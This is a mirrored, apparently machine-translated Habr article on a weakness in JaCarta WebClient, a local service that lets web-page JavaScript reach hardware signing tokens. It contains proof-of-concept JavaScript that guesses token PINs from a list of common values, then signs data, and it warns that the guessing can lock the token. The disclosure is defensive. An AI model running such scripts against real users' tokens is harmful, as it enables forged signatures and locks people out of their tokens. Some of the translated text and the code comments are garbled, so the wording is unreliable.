<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üïö ‚úåüèΩ üçô Menguji JaCarta WebClient atau menyimpan token di brankas ü§¥ üë©‚Äç‚öñÔ∏è üóØÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content=""Ketika sampul hitam diterbangkan untuk sesaat, Margarita berbalik dan melihat bahwa tidak hanya menara berwarna-warni dengan pesawat terbuka di atasn...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Menguji JaCarta WebClient atau menyimpan token di brankas</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/439790/"> <i>"Ketika sampul hitam diterbangkan untuk sesaat, Margarita berbalik dan melihat bahwa tidak hanya menara berwarna-warni dengan pesawat terbuka di atasnya, tetapi juga beberapa waktu yang lalu bahwa kota itu sendiri telah turun ke tanah dan hanya meninggalkan kabut."</i> <i><br><br></i>  <i>M.A.</i>  <i>Bulgakov</i> <i><br></i>  <i>"Tuan dan Margarita"</i> <br><br>  Halo, Habr!  Mungkin hampir setiap organisasi Rusia memiliki produk ini dalam pewarnaan multi-warna yang ceria.  Kita berbicara tentang produk dan perangkat lunak JaCarta untuk mereka.  Kebahagiaan seperti itu jatuh pada saya juga, dan saya memutuskan untuk sedikit memperluas penutup hitam menyembunyikan esensi mereka, atau API.  Beberapa bank, terutama yang menerbitkan token JaCarta GOST-2 kepada pelanggan mereka, mengharuskan pemasangan aplikasi JC-WebClient dari Aladdin R.D. agar berfungsi. <br><br>  Meskipun tidak ada distribusi baru di situs web resmi pengembang (di bagian Demo Anda dapat mengunduh versi yang lebih lama, tetapi menggunakan API yang sudah ketinggalan zaman), distribusi dapat ditemukan menggunakan Google pada baris "JC-WebClient-4.0.0.1186" di situs RB. <br><br>  Setelah menginstal aplikasi di komputer pengguna, port 24738 terbuka tempat klien ini bekerja. <br><br> <code>https://localhost:24738/JCWebClient.js</code> <br> <br>  Situs web pengembang secara terbuka dan rinci menjelaskan API dari aplikasi ini (serta fungsi bekerja dengan sistem file dari seluruh token line pabrikan ini melalui jcFS.dll, yang merupakan bagian dari paket instalasi "JaCarta Single Client") dan intinya adalah bahwa dengan menggunakan sejumlah fungsi Anda dapat menandatangani tanda tangan digital token dengan apa saja, mengambil kode PIN, atau memblokir token dengan upaya gagal memasukkannya.  Dan semua ini dari jarak jauh melalui Internet. <br><a name="habracut"></a><br>  Bukan rahasia lagi bahwa pengguna sering meninggalkan kode PIN default untuk token, atau kode yang mereka terima (mereka biasanya takut bahwa ketika mengubah kode PIN semuanya akan berhenti berfungsi). <br><br>  Paling sering, kode PIN dari tipe 123456 digunakan, dan token dimasukkan ke port komputer atau hub usb selama hari kerja, atau bahkan sepanjang waktu. <br><br>  Berkat JC-WebClient, jika Anda menyelipkan halaman web atau email dengan JavaScript sederhana ke pengguna seperti itu, Anda dapat, meskipun tidak mendapatkan kunci token (dalam beberapa kasus, ini hanya dimungkinkan dengan secara langsung mengakses sistem file token, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">contoh telah diberikan</a> ), tetapi cobalah mengambil kode PIN dan menandatangani data apa pun dan mengirimkannya ke suatu tempat. <br><br>  Jika 10 upaya yang gagal untuk mengulang, token diblokir, dan seberapa sering itu terjadi, jika kode administrator untuk membuka kunci tidak diatur, maka hanya inisialisasi yang akan membantu.  Dan ini tidak dibayar atas pajak waktu (dan sebagai akibat bunga dan bahkan memblokir akun pajak organisasi pajak), kehilangan dari pemasok, secara umum, barang tidak cukup. <br><br><img src="https://habrastorage.org/webt/vr/wy/qe/vrwyqehr02krqg9muflt0rndgqa.jpeg"><br><br>  Masalah dengan penghitungan kode PIN dapat diselesaikan dengan membuatnya mungkin untuk memasukkannya hanya melalui jendela antarmuka JC-WebClient, atau sebagai ukuran setengah, misalnya, dalam kasus 3 upaya gagal untuk memasukkannya, memblokir otorisasi lebih lanjut dengan menampilkan pesan kepada pengguna dan menunggu sampai dia akan mengkonfirmasi tindakan Anda. <br><br>  Saya menulis skrip uji kecil yang menunjukkan kerentanan ini.  Script bekerja pada semua browser modern dan relatif modern, bahkan IE :) <br><br>  Secara alami, ia tidak mengirim apa pun ke mana pun, tetapi hanya menampilkan hasil dari serangkaian fungsi. <br><br>  Script mengimplementasikan enumerasi lengkap 10 upaya untuk memasukkan kode pin "untuk membunuh" token, sehingga Anda dapat menjalankan skrip hanya dengan token uji! <br><br>  Perlu juga diingat bahwa penggunaan skrip ini selain dari token tes sendiri merupakan pelanggaran hukum. <br><br>  Hasil tes: <br><br><img src="https://habrastorage.org/webt/et/g1/ma/etg1ma5gplp9lsyedbytdzxtcx8.jpeg"><br>  Script menghasilkan pasangan kunci dan sertifikat menggunakan JC-WebClient untuk pengujian. <br>  Anda dapat menggunakan EToken PRO Java 72 K, JaCarta GOST, JaCarta GOST-2.  Token harus diinisialisasi dengan PIN pengguna 111111. <br><br>  Sebelum memulai pengujian, Anda harus menginstal JC-WebClient versi 4 atau yang lebih baru. <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient   "+" "); //  JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write(" JCWebClient2 " + vers +" "); //         var slots = JCWebClient2.getAllSlots(); document.write(" : "+slots.length+" "); //   for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write(": "+slot.device.name+" "+slot.device.model+" "); } var tokenID = slot.id, //   userPin = '111111'; // PIN-  //       // (  JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('1) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //  PIN- JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: userPin } }); //    // (  JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('2) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //          var keyPairID = JCWebClient2.createKeyPair({ args: { paramSet: "XA", description: "my description", algorithm: JCWebClient2.Vars.KeyAlgorithm.GOST_2012_256 } }); //     (Distinguished Name (DN)), //    (Common Name, (CN)) var dn = { 'CN': '123', 'C': 'RU' }; //  ,      var exts = { 'keyUsage': 'Digital Signature' }; //   var contID = JCWebClient2.generateUserSelfSignedCertificate({ args: { keyPairID: keyPairID, dn: dn, exts: exts, days: 365 } }); //    var list=[]; //   list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); // id      var data = list[0]; var contID = data.id; document.write("ID : "+data.id+" "); document.write(" : "+data.description+" "); document.write(" : "+data.algorithm+" "); //   PIN- JCWebClient2.unbindToken();</span></span></code> </pre> <br>  Dan sebenarnya skrip audit keamanan itu sendiri: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient   "+" "); //  JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write(" JCWebClient2 " + vers +" "); //         var slots = JCWebClient2.getAllSlots(); document.write(" : "+slots.length+" "); //   for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write(": "+slot.device.name+" "+slot.device.model+" "); } //   var tokenID = slot.id; //       // (  JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //    var list=[]; //   list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); // id     var data = list[0]; var contID = data.id; document.write("ID : "+data.id+" "); document.write(" : "+data.description+" "); document.write(" : "+data.algorithm+" "); //    (Hello World  Base64) var dataToSign = 'SGVsbG8sIFdvcmxkIQ=='; document.write("  : "+dataToSign+" "); //   var pin=["1234567890", "123456", "1234567", "12345678", "123456789", "0987654321", "111111", "qwerty", "012345", "0123456", "01234567"]; //  function bind(pass) { JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: pass } }); } var i=0; //     //!  10    !!!!!!!!!! while (i &lt; 10) { i++; try{ bind(pin[i]); tokenState = JCWebClient2.getLoggedInState(); //  ,      if(tokenState.state=1) { document.write("   : "+pin[i]+" "); break; } } //    catch(e){document.write(e+" ");} } //    // (  JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //   var CertificateBody=JCWebClient2.getCertificateBody({ args: { id: contID } }); document.write("CertificateBody: "+CertificateBody+" "); //  ,        Base64 var signedData = JCWebClient2.signBase64EncodedData({ args: { contID: contID, data: dataToSign, attachedSignature: true } }); document.write(" . "); document.write(" : "+signedData+" "); //  var signature = signedData; var res = JCWebClient2.verifyBase64EncodedData({ args: { signature: signature } }); document.write("  : "+res+" "); //   PIN- JCWebClient2.unbindToken();</span></span></code> </pre> <br>  ‚Üí <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Sumber Informasi API JC-WebClient</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id439790/">https://habr.com/ru/post/id439790/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id439780/index.html">PHP Digest No. 149 (28 Januari - 11 Februari 2019)</a></li>
<li><a href="../id439782/index.html">CMS tanpa kepala - masa depan dalam manajemen konten</a></li>
<li><a href="../id439784/index.html">Mesin Metana Raptor Memecah Rekor RD-180</a></li>
<li><a href="../id439786/index.html">Ulasan IP-phone Snom D712 (dan sedikit D710)</a></li>
<li><a href="../id439788/index.html">Keanehan lain dalam algoritma GOST Grasshopper dan Stribog</a></li>
<li><a href="../id439792/index.html">NASA sedang mencari mitra di industri Amerika untuk menciptakan pendaratan berawak sebagian yang dapat digunakan kembali</a></li>
<li><a href="../id439794/index.html">Nyeri punggung - pemahaman dari perspektif kedokteran modern</a></li>
<li><a href="../id439796/index.html">Spring Boot 2: apa yang tidak mereka tulis dalam catatan rilis</a></li>
<li><a href="../id439804/index.html">Zen dari Unit Testing</a></li>
<li><a href="../id439806/index.html">Nama Domain SSL Valid untuk Wadah Docker Lokal</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>